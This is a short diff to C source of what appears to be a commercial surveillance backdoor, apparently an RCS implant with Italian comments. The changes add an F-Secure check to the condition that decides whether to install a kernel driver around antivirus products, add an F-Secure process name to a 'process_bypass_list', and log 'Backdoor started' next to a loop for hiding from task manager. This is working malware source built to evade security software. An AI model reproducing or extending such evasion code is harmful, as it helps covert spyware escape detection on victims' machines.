@@ -1496,7 +1496,7 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
-		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())) {
+		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())  && (!IsFSecure() || IsDeepFreeze())) {
 		WCHAR drv_path[DLLNAMELEN*2];
 
 		if (!HM_GuessNames()) {
@@ -2156,6 +2156,7 @@ void HM_UpdateGlobalConf()
 	strcpy(process_bypass_list[25],"pcts*.exe");
 	strcpy(process_bypass_list[26],"iexplore.exe");
 	strcpy(process_bypass_list[27],"chrome.exe");
+	strcpy(process_bypass_list[28],"fsm32.exe");
 	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS
 
 	// Legge il delta date dal file di stato...
@@ -2598,7 +2599,7 @@ void __stdcall HM_sMain(void)
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
 
-	REPORT_STATUS_LOG("\r\n RCSv7.5 fully operational\r\n\r\n");
+	REPORT_STATUS_LOG("\r\n RCSv7.4 fully operational\r\n\r\n");
 	SendStatusLog(L"[Core Module]: Backdoor started");
 
 	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
